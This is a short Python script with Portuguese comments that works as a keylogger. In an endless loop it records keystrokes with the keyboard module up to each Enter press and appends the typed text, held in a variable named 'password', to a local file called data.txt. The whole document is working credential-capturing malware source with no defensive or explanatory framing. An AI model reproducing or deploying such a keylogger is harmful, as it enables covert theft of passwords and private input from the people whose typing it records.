# Importando o módulo keyboard que irá acessar as entradas do teclado
import keyboard

# Definir o nome e o caminho do arquivo de texto
path = "data.txt"

while True:
    with open(path, 'a') as data_file:
        try:     
            # Todas as teclas pressionadas são registradas como uma lista de "eventos"
            events = keyboard.record('enter')
            password = list(keyboard.get_typed_strings(events))
            # Uma nova linha é escrita antes dos dados serem escritos
            data_file.write('\n') 
            data_file.write(password[0])
        except KeyboardInterrupt:
            print('Saindo do programa')
            break